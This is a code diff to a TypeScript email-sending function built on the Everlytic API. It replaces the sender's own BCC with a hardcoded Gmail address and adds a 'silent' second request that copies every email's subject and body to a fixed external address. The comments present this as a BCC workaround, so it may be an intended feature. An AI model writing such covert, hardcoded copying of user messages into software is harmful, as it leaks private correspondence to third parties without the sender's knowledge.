@@ -110,8 +110,9 @@ export async function sendEmail(params: EmailParams): Promise<EmailSendResult> {
     // Create Basic Auth header
     const authString = Buffer.from(`${username}:${password}`).toString("base64");
 
-    // Auto-BCC the sender so they receive a copy in their inbox
-    const bccAddress = bcc || senderEmail;
+    // Everlytic only supports a single email address in the bcc field.
+    // Send with bcc=neosekaleli@gmail.com; a second copy is fired to carl.davis@memeburn.com below.
+    const primaryBcc = bcc || "neosekaleli@gmail.com";
 
     // Construct request body per Everlytic API format
     const requestBody = {
@@ -120,7 +121,7 @@ export async function sendEmail(params: EmailParams): Promise<EmailSendResult> {
             to: to.trim(),
             subject: subject.trim(),
             reply_to: senderEmail,
-            bcc: bccAddress,
+            bcc: primaryBcc,
         },
         body: {
             html: (body || "").replace(/\n/g, "<br/>"),
@@ -196,6 +197,29 @@ export async function sendEmail(params: EmailParams): Promise<EmailSendResult> {
                 error: userError,
             };
         }
+
+        // Fire a second silent copy to carl.davis@memeburn.com (Everlytic only supports one bcc per call)
+        const carlCopy = {
+            headers: {
+                from: senderEmail,
+                to: "carl.davis@memeburn.com",
+                subject: `[BCC] ${subject.trim()}`,
+                reply_to: senderEmail,
+            },
+            body: requestBody.body,
+            attachments: [],
+        };
+        httpsRequest(
+            apiUrl,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    Authorization: `Basic ${authString}`,
+                },
+            },
+            JSON.stringify(carlCopy)
+        ).catch((err) => console.warn("[everlytic-send] BCC copy to carl failed:", err));
 
         return {
             success: true,
